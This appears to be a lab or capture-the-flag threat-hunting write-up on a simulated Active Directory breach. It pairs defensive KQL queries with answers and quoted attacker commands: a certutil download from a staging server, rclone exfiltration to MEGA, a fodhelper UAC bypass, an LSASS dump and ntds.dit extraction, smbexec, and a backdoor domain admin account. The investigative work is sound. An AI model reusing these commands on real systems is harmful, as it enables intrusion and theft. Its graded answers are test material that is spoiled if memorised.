# 🔥 EMBERFORGE: Source Leak — Active Directory Attack Investigation

**Category:** Threat Hunting | Active Directory | Microsoft Sentinel  
**Date:** January 30, 2026  
**Environment:** `emberforge.local` Active Directory domain — 3 hosts  
**Tools:** KQL · Sysmon · Microsoft Sentinel · Custom Log Table (`EmberForgeX_CL`)  
**Log Source:** Sysmon EventCodes 1 (Process Create), 3 (Network), 8 (CreateRemoteThread), 11 (FileCreate), 13 (RegistryEvent), 22 (DNSQuery)

---

## 📋 Scenario

> *"A game development studio's proprietary source code appeared on underground forums. Internal source data was stolen from the domain."*

**Compromised Host (initial):** `EC2AMAZ-B9GHHO6` (workstation — `lmartin`)  
**Server:** `EC2AMAZ-16V3AU4`  
**Domain Controller:** `EC2AMAZ-EEU3IA2`

---

## 🔍 Investigation

---

### 🟢 DATA SOURCE — Stolen Data Directory

The stolen data was compressed from a source directory before exfiltration.

**Question:** What directory was the source of the stolen data?  
**Answer:** `C:\GameDev`  
**Timestamp:** `2026-01-30 23:11:28.112`

```kql
EmberForgeX_CL
| where EventCode_s == "1"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s contains "Compress-Archive"
    or CommandLine_s contains "7z"
    or CommandLine_s contains ".zip"
    or CommandLine_s contains ".rar"
    or CommandLine_s contains ".7z"
    or CommandLine_s contains "tar"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 📤 EXFILTRATION — Cloud Destination

The stolen data was uploaded to a cloud storage service. The exfiltration tool's command line contains both the service name and authentication details.

**Question:** What cloud provider received the data?  
**Answer:** `MEGA`  
**Timestamp:** `2026-01-30 23:11:44.379`

*Query: Same as Q1 above.*

---

### 🕵️ ATTRIBUTION — Attacker Email

Attackers make OPSEC mistakes. The exfiltration tool was configured with credentials visible in the command line.

**Question:** What email account was used to authenticate to the cloud service?  
**Answer:** `jwilson.vhr@proton.me`  
**Timestamp:** `2026-01-30 23:12:36.922`

```kql
EmberForgeX_CL
| where EventCode_s == "1"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s contains "rclone.conf"
    or CommandLine_s contains "rclone config"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 💀 DOMAIN COMPROMISE — AD Database

This was not just a workstation compromise. Evidence on the Domain Controller shows the attacker used volume snapshot techniques to access a locked system file containing every credential in the domain.

**Question:** What was the file?  
**Answer:** `ntds.dit`  
**Timestamp:** `2026-01-30 23:35:15.307`

```kql
EmberForgeX_CL
| where EventCode_s == "1"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s contains "shadow"
    or CommandLine_s contains "vssadmin"
    or CommandLine_s contains "vshadow"
    or CommandLine_s contains "ntds"
    or CommandLine_s contains "NTDS"
    or CommandLine_s contains "diskshadow"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 🔧 EXFILTRATION — Tool Used

A cloud synchronisation tool was used to upload data externally. This legitimate software is commonly abused by threat actors. It was executed multiple times, not all successfully.

**Question:** What exfiltration tool was used?  
**Answer:** `rclone.exe`  
**Timestamp:** `2026-01-30 23:07:45.695`

```kql
-- Execution across 3 hosts
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s contains "rclone"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc

-- Checking for staged archives
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s contains "gamedev.zip"
    or CommandLine_s contains "mega:"
    or CommandLine_s contains "rclone.conf"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 🌐 EXFILTRATION — Destination IP

The exfiltration tool made outbound network connections during the upload. Correlate the tool's process with its network activity (EventCode 3).

**Question:** What IP address received the stolen data?  
**Answer:** `66.203.125.15:443`  
**Timestamp:** `2026-01-30 23:12:53.154`

```kql
EmberForgeX_CL
| where EventCode_s == "3"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| parse Raw_s with * "Image'>" Image "<" *
| parse Raw_s with * "DestinationIp'>" DestinationIp "<" *
| parse Raw_s with * "DestinationPort'>" DestinationPort "<" *
| where Image contains "rclone"
| project UtcTime_s, Computer, Image, DestinationIp, DestinationPort
| sort by UtcTime_s asc
```

---

### 🔑 OPSEC FAILURE — Plaintext Password

The exfiltration tool was executed multiple times as the attacker troubleshot authentication issues. One execution exposed credentials far more recklessly than the others.

**Question:** What was the plaintext password exposed?  
**Answer:** `Summer2024!`  
**Timestamp:** `2026-01-30 23:08:28.665`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s contains "gamedev.zip"
    or CommandLine_s contains "mega:"
    or CommandLine_s contains "rclone.conf"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s, IPAddress, DestinationIp_s
| sort by UtcTime_s asc
```

---

### 📦 COLLECTION — Archive Method

Before exfiltration, the stolen data was compressed using a built-in OS capability — a Living Off The Land technique.

**Question:** What cmdlet created the archive?  
**Answer:** `Compress-Archive`  
**Timestamp:** `2026-01-30 23:11:28.112`

```kql
EmberForgeX_CL
| where EventCode_s == "1"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s contains "7z"
    or CommandLine_s contains "tar"
    or CommandLine_s contains "Compress"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 🌍 INFRASTRUCTURE — Staging Server

The attacker did not bring tools manually. They downloaded utilities from external infrastructure they controlled. Multiple commands across the environment reference the same staging server.

**Question:** What was the attacker's staging server?  
**Answer:** `sync.cloud-endpoint.net`  
**Timestamp:** `2026-01-30 22:10:52.789`

```kql
EmberForgeX_CL
| where EventCode_s == "1"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s contains "DownloadFile"
    or CommandLine_s contains "certutil"
    or CommandLine_s contains "bitsadmin"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

**Additional Exfiltration Channels — Checked & Documented:**

| Channel | Finding |
|---------|---------|
| DNS Tunnelling | ❌ Ruled out — No long/encoded subdomains consistent with DNS tunnelling |
| rclone → MEGA | ✅ Confirmed primary exfil — `C:\Users\Public\rclone.exe` → `66.203.125.15:443` |
| AnyDesk | ⚠️ Possible secondary channel — outbound connections to `57.128.101.77:443` — cannot be fully ruled out |
| `update.exe` + `rundll32.exe` C2 | ℹ️ C2 callback to `104.21.30.237:443`, not bulk data exfiltration |

> **Conclusion:** Confirmed exfiltration is `rclone → MEGA`. AnyDesk cannot be fully ruled out. No DNS tunnelling evidence.

---

### 🧬 INITIAL ACCESS — Malicious File

Work backwards. Trace the process chain to the very first malicious execution. The incident started with Lisa opening something from her desktop.

**Question:** What was the initial malicious file?  
**Answer:** `review.dll`  
**Timestamp:** `2026-01-30 21:27:03.300`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where CommandLine_s contains "rundll32"
    or CommandLine_s contains "mshta"
    or CommandLine_s contains "wscript"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> **Answer to CISO:** Lisa was likely targeted — a DLL delivered via removable media (`D:\`) named `review.dll` suggests a deliberate social engineering lure, not opportunistic malware.

---

### 💾 INITIAL ACCESS — Delivery Vector

The drive letter of the malicious file is significant. Mounted disk images (ISO, IMG, VHD) appear as virtual drives and bypass certain Windows security protections.

**Question:** What drive letter was the malicious file delivered from?  
**Answer:** `D:\`  
**Timestamp:** `2026-01-30 21:27:03.300`

---

### 👤 INITIAL ACCESS — Patient Zero

The User field in process creation events identifies which account executed the payload.

**Question:** Which account was hit first?  
**Answer:** `lmartin` / `EMBERFORGE\lmartin`  
**Timestamp:** `2026-01-30 21:27:03.300`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where CommandLine_s contains "review.dll"
| parse Raw_s with * "User'>" User "<" *
| project UtcTime_s, Computer, User, CommandLine_s
```

> `EMBERFORGE\lmartin` executed `review.dll` via `rundll32.exe` at `21:27:03` on `EC2AMAZ-B9GHHO6.emberforge.local` — patient zero confirmed.

---

### ⛓️ EXECUTION — Process Chain

Every process has a parent, and that parent has a parent.

**Question:** What was the full execution chain?  
**Answer:** `explorer.exe > rundll32.exe > review.dll`  
**Timestamp:** `2026-01-30 21:27:03.300`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where CommandLine_s contains "rundll32"
    or CommandLine_s contains "mshta"
    or CommandLine_s contains "wscript"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

| Process | Role |
|---------|------|
| `explorer.exe` | Lisa double-clicked the file — Windows Explorer spawned `rundll32` |
| `rundll32.exe` | Legitimate Windows utility abused to load the malicious DLL |
| `review.dll` | Malicious payload loaded from `D:\` with entry point `StartW` |

---

### 📦 DELIVERY — Unpacking Step

Before the malicious DLL was loaded, the user opened a downloaded archive. A compression tool extracted its contents to a folder in the user's profile.

**Question:** What was the extraction step before DLL execution?  
**Answer:** `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\`  
**Timestamp:** `2026-01-30 21:24:04.656`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where CommandLine_s contains "Downloads"
    or CommandLine_s contains "lmartin"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 💣 EXECUTION — Dropped Payload

Shortly after initial DLL execution, a new executable appeared in a world-writable directory — the attacker's primary tool for the rest of the operation.

**Question:** What was the dropped payload path?  
**Answer:** `C:\Users\Public\update.exe`  
**Timestamp:** `2026-01-30 21:36:34.586`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "11"
| where Computer contains "B9GHHO6"
| parse Raw_s with * "TargetFilename'>" TargetFilename "<" *
| where TargetFilename endswith ".exe"
| project UtcTime_s, Computer, TargetFilename
| sort by UtcTime_s asc
```

> `update.exe` was installed as a scheduled task — `schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system` — meaning it will execute as **SYSTEM** on every reboot. It should be considered still active until confirmed removed.

---

### 🌐 C2 — Domain

The malware communicates with the attacker. Sysmon EventCode 22 captures every DNS query a process makes.

**Question:** What is the C2 domain?  
**Answer:** `cdn.cloud-endpoint.net`  
**Timestamp:** `2026-01-30 21:40:26.810`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "22"
| parse Raw_s with * "Image'>" Image "<" *
| parse Raw_s with * "QueryName'>" QueryName "<" *
| parse Raw_s with * "QueryResults'>" QueryResults "<" *
| where Image contains "update.exe"
| project UtcTime_s, Computer, Image, QueryName, QueryResults
| sort by UtcTime_s asc
```

---

### 🌐 C2 — Primary IP

DNS queries resolve domains to IP addresses. Parse the `QueryResults` field from EventCode 22 raw XML.

**Question:** What is the primary C2 IP?  
**Answer:** `104.21.30.237`  
**Timestamp:** `2026-01-30 21:40:24.206`

*Query: Same as C2 Domain above (parse `QueryResults` field).*

---

### 💉 DEFENSE EVASION — Code Injection Chain

The attacker injected code from one process into another to hide. Sysmon EventCode 8 (CreateRemoteThread) captures this.

**Question:** Trace the first injection chain. Format: `source.exe > target.exe`  
**Answer:** `rundll32.exe > notepad.exe`  
**Timestamp:** `2026-01-30 21:32:42.708`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "8"
| parse Raw_s with * "SourceImage'>" SourceImage "<" *
| parse Raw_s with * "TargetImage'>" TargetImage "<" *
| project UtcTime_s, Computer, SourceImage, TargetImage
| sort by UtcTime_s asc
```

---

### 🔼 PRIVILEGE ESCALATION — UAC Bypass Binary

Certain Windows executables are trusted to auto-elevate without a UAC prompt. The attacker used registry modification followed by a trusted binary execution.

**Question:** What binary was used to bypass UAC?  
**Answer:** `fodhelper.exe`  
**Timestamp:** `2026-01-30 21:39:02.511`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s contains "fodhelper"
    or CommandLine_s contains "eventvwr"
    or CommandLine_s contains "computerdefaults"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> **How the bypass worked:**
> 1. `review.dll` modified `HKCU\Software\Classes\ms-settings\shell\open\command` to point to `C:\Users\Public\update.exe`
> 2. `fodhelper.exe` — a trusted auto-elevating Windows binary — was launched, inheriting the registry hijack and executing the payload with **elevated privileges** — bypassing UAC silently

---

### 🔑 PRIVILEGE ESCALATION — Registry Bypass Key

The UAC bypass requires two registry modifications in quick succession. One sets the payload path. The other enables the hijack.

**Question:** What registry value name enables the hijack?  
**Answer:** `DelegateExecute`  
**Timestamp:** `2026-01-30 21:38:50.904`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "13"
| where Computer contains "B9GHHO6"
| parse Raw_s with * "TargetObject'>" TargetObject "<" *
| parse Raw_s with * "Details'>" Details "<" *
| where TargetObject contains "ms-settings"
    or TargetObject contains "DelegateExecute"
| project UtcTime_s, Computer, TargetObject, Details
| sort by UtcTime_s asc
```

> **The two registry modifications at `21:38:33` and `21:38:50`:**
> - `ms-settings\shell\open\command\(Default)` → set to `C:\Users\Public\update.exe`
> - `ms-settings\shell\open\command\DelegateExecute` → set to *(empty)*
>
> Setting `DelegateExecute` to empty tells Windows to treat the command as a COM elevation request, causing `fodhelper.exe` to execute the payload with elevated privileges — bypassing UAC silently.

---

### 💉 DEFENSE EVASION — Stable Injection Chain

After the UAC bypass, the elevated beacon performed a second injection for long-term stability into a process running in a completely different security context.

**Question:** What was the second injection for long-term stability? Format: `source.exe > target.exe (CONTEXT)`  
**Answer:** `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)`  
**Timestamp:** `2026-01-30 21:56:44.706`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "8"
| where Computer contains "B9GHHO6"
| parse Raw_s with * "SourceImage'>" SourceImage "<" *
| parse Raw_s with * "TargetImage'>" TargetImage "<" *
| parse Raw_s with * "SourceUser'>" SourceUser "<" *
| parse Raw_s with * "TargetUser'>" TargetUser "<" *
| project UtcTime_s, Computer, SourceImage, SourceUser, TargetImage, TargetUser
| sort by UtcTime_s asc
```

> Source: `update.exe` running as `EMBERFORGE\lmartin` (user-level) injected into `spoolsv.exe` running as `NT AUTHORITY\SYSTEM` — achieving **privilege escalation through injection**, hidden inside a legitimate Windows service.

---

### 🔑 CREDENTIAL ACCESS — LSASS Dump Process

LSASS holds credentials for every logged-in user. The attacker dumped its memory to disk using **direct syscalls** to bypass API monitoring — no `ProcessAccess` events (EventCode 10) for LSASS will be found.

**Question:** What process created the dump file?  
**Answer:** `update.exe`  
**Timestamp:** `2026-01-30 21:48:13.892`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "11"
| parse Raw_s with * "TargetFilename'>" TargetFilename "<" *
| parse Raw_s with * "Image'>" Image "<" *
| where TargetFilename contains ".dmp"
    or TargetFilename contains "lsass"
    or TargetFilename contains "dump"
| project UtcTime_s, Computer, Image, TargetFilename
| sort by UtcTime_s asc
```

---

### 🔑 CREDENTIAL ACCESS — Dump Location

**Question:** Where was the credential dump written?  
**Answer:** `C:\Windows\System32\lsass.dmp`  
**Timestamp:** `2026-01-30 21:48:13.892`

*Query: Same as above (EventCode 11, file creation).*

---

### 🔭 DISCOVERY — User Enumeration

**Question:** What was the first command in the discovery sequence? Format: Full command as logged  
**Answer:** `net user /domain`  
**Timestamp:** `2026-01-30 21:34:32.951`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s contains "net user"
    or CommandLine_s contains "Get-ADUser"
    or CommandLine_s contains "dsquery"
    or CommandLine_s contains "ldapsearch"
    or CommandLine_s contains "net group"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> **Full discovery sequence — all 4 commands spawned by `review.dll` within 8 minutes of infection:**
>
> | Time | Command | Purpose |
> |------|---------|---------|
> | 21:34:19 | `ipconfig /all` | Local network config |
> | 21:34:32 | `net user /domain` | All domain users |
> | 21:34:44 | `net group "Domain Admins" /domain` | Privilege mapping |
> | 21:35:07 | `nltest /dclist:emberforge.local` | Locate Domain Controllers |

---

### 🔭 DISCOVERY — Privilege Enumeration

Immediately after listing users, the attacker queried a specific group to identify who has the highest level of access.

**Question:** What group was queried?  
**Answer:** `net group "Domain Admins" /domain`  
**Timestamp:** `2026-01-30 21:34:44.359`

---

### 🗺️ DISCOVERY — Infrastructure Mapping

**Question:** What was the final discovery command used to locate critical infrastructure?  
**Answer:** `nltest /dclist:emberforge.local`  
**Timestamp:** `2026-01-30 21:35:07.115`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where CommandLine_s contains "nltest"
    or CommandLine_s contains "ping"
    or CommandLine_s contains "ipconfig"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### ➡️ LATERAL MOVEMENT — Tool Staging Share

Before moving laterally, the attacker set up the workstation as a distribution point by creating a network share.

**Question:** What was the share creation command?  
**Answer:** `net share tools=C:\Users\Public /grant:everyone,full`  
**Timestamp:** `2026-01-30 22:51:36.868`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s contains "net share"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> Share `tools` pointed to `C:\Users\Public` — where all attacker tools were staged (`update.exe`, `rclone.exe`, `AnyDesk.exe`) — with full access for everyone. Deleted at `23:49:25` via `net share tools /delete`.

---

### 🔥 LATERAL MOVEMENT — Firewall Manipulation

The workstation's firewall was blocking inbound connections needed for lateral movement. A rule was added.

**Question:** What name was given to the firewall rule?  
**Answer:** `SMB`  
**Timestamp:** `2026-01-30 22:54:09.901`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where CommandLine_s contains "netsh"
    or CommandLine_s contains "firewall"
    or CommandLine_s contains "advfirewall"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> `netsh advfirewall firewall add rule name="SMB" dir=in action=allow protocol=tcp localport=445` — opened SMB port 445 for lateral movement.

---

### 👻 POST-ESCALATION — Parent Process

After beacon migration to a SYSTEM process, all subsequent attacker commands on the workstation were executed as children of that process.

**Question:** What was the post-escalation parent process?  
**Answer:** `spoolsv.exe`

*Query: Same as Stable Injection Chain (EventCode 8).*

---

### ➡️ LATERAL MOVEMENT — Beacon Distribution

The attacker pushed their primary tool to the server via Windows admin shares (`C$`).

**Question:** What was the full command?  
**Answer:** `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe`  
**Timestamp:** `2026-01-30 22:14:55.324`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where CommandLine_s contains "C$"
    or CommandLine_s contains "copy"
    or CommandLine_s contains "xcopy"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 🔧 LATERAL MOVEMENT — LOLBin Tool Staging (Server)

On the server, a built-in Windows utility was abused to download tools from the attacker's staging infrastructure.

**Question:** What utility was used and what was the full URL?  
**Answer:** `certutil.exe` → `http://sync.cloud-endpoint.net:8080/AnyDesk.exe`  
**Timestamp:** `2026-01-30 22:17:02.053`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "16V3AU4"
| where CommandLine_s contains "certutil"
    or CommandLine_s contains "bitsadmin"
    or CommandLine_s contains "urlcache"
    or CommandLine_s contains "cloud-endpoint"
    or CommandLine_s contains "http://"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> Additional downloads observed: `http://sync.cloud-endpoint.net:8080/update.exe` — all spawned by `services.exe`, indicating remote execution via a service-based mechanism.

---

### 🔧 LATERAL MOVEMENT — Remote Execution Evidence

The attacker used a remote execution technique (Impacket `smbexec`) that creates temporary Windows services with random names. This answer is case-sensitive.

**Question:** What was the randomly named service created?  
**Answer:** `MzLblBFm`  
**Timestamp:** `2026-01-30 22:07:45.975`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "13"
| where Computer contains "16V3AU4"
| parse Raw_s with * "TargetObject'>" TargetObject "<" *
| parse Raw_s with * "Details'>" Details "<" *
| where TargetObject contains "Services"
| project UtcTime_s, Computer, TargetObject, Details
| sort by UtcTime_s asc
```

> `MzLblBFm` — first service created at `22:07:45`, preceding all other tool staging activity on that host. This was the **initial Impacket smbexec entry point** for lateral movement.

---

### 🔭 LATERAL MOVEMENT — First Command on Server

The remote execution technique redirects command output to temporary files. The very first attacker command on any newly compromised host is almost always the same.

**Question:** What was the first command on the server?  
**Answer:** `whoami`  
**Timestamp:** `2026-01-30 22:08:18.775`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "16V3AU4"
| where ParentCommandLine_s contains "services.exe"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> The full obfuscated smbexec command wrapper:
> ```
> C:\Windows\system32\cmd.exe /Q /c echo whoami > \\EC2AMAZ-16V3AU4\C$\__output_QoCDsxXQ 2>&1 > C:\Windows\pPrBLvAi.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\pPrBLvAi.bat & del C:\Windows\pPrBLvAi.bat
> ```
> This creates a batch file, executes it, and immediately deletes it — a "leave no trace" tactic.

---

### 🔐 LATERAL MOVEMENT — Failed Auth Protocol

Authentication logs show repeated failures from an internal host before the attacker pivoted to smbexec.

**Question:** What protocol was used in the failed authentication attempts?  
**Answer:** `NTLM`

> The attacker had credentials (`EMBERFORGE\Administrator` / `EmberForge2024!`) and was attempting NTLM network logons (Logon Type 3) before switching to smbexec as the reliable execution method.

---

### 🏛️ DOMAIN CONTROLLER — Arrival and Credential Extraction

The same remote execution pattern from the server was used against the DC.

**Question:** Trace the first command and the extraction tool. Format: `first_command > tool.exe`  
**Answer:** `whoami > vssadmin.exe`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EEU3IA2"
| where ParentCommandLine_s contains "services.exe"
| parse Raw_s with * "CommandLine'>" CommandLine "<" *
| project UtcTime_s, Computer, CommandLine
| sort by UtcTime_s asc
```

---

### 💀 IMPACT — Backdoor Account

After extracting the database, the attacker created a new account designed to blend in with legitimate service accounts.

**Question:** What username was created by the attacker?  
**Answer:** `svc_backup`  
**Timestamp:** `2026-01-30 23:38:11.786`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EEU3IA2"
| where CommandLine_s contains "net user"
    or CommandLine_s contains "net group"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> Commands executed in sequence:
> ```
> net user svc_backup P@ssw0rd123! /add /domain
> net group "Domain Admins" svc_backup /add /domain
> ```

---

### 💀 IMPACT — Backdoor Account Password

**Question:** What password was set for the backdoor account?  
**Answer:** `P@ssw0rd123!` *(exposed in plaintext in command line logs)*

---

### 💀 IMPACT — Privilege Assignment

**Question:** What group was the backdoor account added to?  
**Answer:** `Domain Admins`  
**Timestamp:** `2026-01-30 23:39:37.952`

---

### 🔑 CREDENTIAL EXPOSURE — Network Drive Mapping

The attacker needed to map a network drive on the DC to access tools. The drive mapping command included authentication credentials in plain text.

**Question:** What were the exposed credentials?  
**Answer:** `EmberForge2024!`  
**Timestamp:** `2026-01-30 22:57:27.564`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s contains "net use"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> `net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!` — exposed across both `EC2AMAZ-16V3AU4` and `EC2AMAZ-EEU3IA2`.

---

### 🔑 CREDENTIAL THEFT — Techniques Checked & Documented

| Technique | Status | Notes |
|-----------|--------|-------|
| Kerberoasting | ❌ Not detected | No `setspn`, `GetUserSPNs`, or kerberoasting commands found |
| AS-REP Roasting | ❌ Not detected | No `GetNPUsers`, `ASREPRoast`, or pre-auth abuse found |
| DCSync | ❌ Not detected | No `mimikatz`, `lsadump`, `drsuapi`, or DCSync commands found |
| **LSASS dump** | ✅ Confirmed | `update.exe` → `C:\Windows\System32\lsass.dmp` via direct syscalls |
| **ntds.dit extraction** | ✅ Confirmed | Via VSS shadow copy (`vssadmin`) on DC — copied to `C:\Windows\Temp\nyMdRNSp.tmp` |
| **Plaintext creds in CLI** | ✅ Confirmed | `EmberForge2024!` and `P@ssw0rd123!` and `Summer2024!` all exposed in logs |

---

### 🟠 PERSISTENCE — Scheduled Task

The attacker created a scheduled task to ensure their payload survives reboots, named to look legitimate.

**Question:** What was the scheduled task name?  
**Answer:** `WindowsUpdate`  
**Timestamp:** `2026-01-30 21:37:16.145`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s contains "schtasks"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 🟠 PERSISTENCE — Remote Access Tool

A legitimate remote management application was silently installed for unattended access.

**Question:** What was it?  
**Answer:** `AnyDesk`  
**Timestamp:** `2026-01-30 22:10:52.789`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where CommandLine_s contains "Anydesk"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

> Installed on `EC2AMAZ-B9GHHO6` (22:19:34) and `EC2AMAZ-16V3AU4` (23:09:37). Downloaded from `http://sync.cloud-endpoint.net:8080/AnyDesk.exe`. Configured for unattended access via hardcoded password hash in `system.conf`.

---

### 🟠 PERSISTENCE — AnyDesk Configuration

**Question:** What was the full path to the AnyDesk configuration file?  
**Answer:** `C:\ProgramData\AnyDesk\system.conf`

> Commands executed by attacker:
> ```cmd
> cmd.exe /c type C:\ProgramData\AnyDesk\system.conf
> cmd.exe /c "echo ad.security.interactive_access=2 >> C:\ProgramData\AnyDesk\system.conf"
> cmd.exe /c "echo ad.security.unattended_access_password_hash=5e884898da28047d91089d3f7c6e12d05d0fb9e2 >> C:\ProgramData\AnyDesk\system.conf"
> ```

**Persistence Mechanisms — Checked & Documented:**

| Mechanism | Status | Detail |
|-----------|--------|--------|
| WMI Event Subscriptions | ❌ Not detected | No WMI subscription commands found |
| Registry Run Keys | ✅ Confirmed | AnyDesk registered in `RunNotification` on both workstation and server |
| Startup Folder | ✅ Confirmed | `AnyDesk.lnk` in startup folder on two hosts |
| Scheduled Tasks | ✅ Confirmed | `WindowsUpdate` task running `update.exe` as SYSTEM on reboot |
| Services | ✅ Confirmed | Random smbexec services + AnyDesk `--start-with-win` service on both hosts |

---

